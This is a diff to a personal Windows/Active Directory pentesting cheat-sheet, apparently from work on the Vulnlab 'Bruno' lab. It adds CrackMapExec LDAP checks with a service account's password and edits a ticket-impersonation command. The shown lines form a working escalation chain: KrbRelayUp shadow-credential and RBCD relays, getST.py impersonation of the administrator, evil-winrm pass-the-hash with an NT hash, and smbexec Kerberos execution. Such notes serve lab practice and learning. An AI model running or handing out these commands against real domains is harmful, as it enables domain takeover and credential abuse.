@@ -623,6 +623,9 @@ https://vulndev.io/cheats-windows/
 ```
 Did this on Vulnlab Bruno
 
+cme ldap bruno.vl -u 'svc_scan' -p 'Sunshine1' -M maq
+cme ldap bruno.vl -u 'svc_scan' -p 'Sunshine1' -M ldap-checker
+
 
 .\KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 1024
 
@@ -639,7 +642,7 @@ evil-winrm -i $ip -u administrator -H '13735c7d60b417421dc6130ac3e0bfd4'
 
 .\KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246
 
-getST.py -impersonate 'administrator' bruno.vl/'KRBRELAYUP$':'uJ1$j05-iN7/gJ6#' -spn HOST/BRUNODC
+getST.py -impersonate 'administrator' bruno.vl/'KRBRELAYUP$':'uM3@eO8=cF9@rT7-' -spn HOST/BRUNODC
 
 smbexec.py administrator@brunodc -k -no-pass
 
